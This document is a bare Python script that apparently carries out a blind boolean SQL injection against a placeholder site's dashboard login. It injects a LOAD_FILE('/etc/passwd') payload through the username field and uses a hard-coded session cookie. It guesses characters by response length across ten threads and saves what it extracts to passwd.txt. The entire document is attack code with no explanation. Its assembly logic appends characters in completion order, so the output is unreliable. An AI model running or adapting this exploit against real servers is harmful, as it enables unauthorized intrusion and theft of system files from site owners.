import requests
import concurrent.futures
url = "http://vulnerable-website.com/dashboard.php"
payload_template = "jack' AND (SELECT (ASCII(SUBSTRING(LOAD_FILE('/etc/passwd'), {position}, 1))) =
{ascii_value}) AND 'random'='random"
start_position = 1
end_position = 5000 # Adjust this value based on the length of the file
start_ascii = 7
end_ascii = 126
headers = {
 "Cookie": "PHPSESSID=13cpgmvv77etrdvfeae92c6sk4",
}
def check_character(position, ascii_val):
 payload = payload_template.format(position=position, ascii_value=ascii_val)
 response = requests.post(url, data={"username": payload}, headers=headers)
 content_length = int(response.headers.get("Content-Length", 0))
 if content_length == 3112:
 print(f"Character found at position {position}: {chr(ascii_val)}")
 return chr(ascii_val)
 return None
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
 futures = []
 for position in range(start_position, end_position + 1):
 for ascii_val in range(start_ascii, end_ascii + 1):
 future = executor.submit(check_character, position, ascii_val)
 futures.append(future)
 result = ""
 for future in concurrent.futures.as_completed(futures):
 char = future.result()
 if char:
 result += char
with open("passwd.txt", "w") as file:
 file.write(result)
print("Extraction complete. Check the 'passwd.txt' file.")
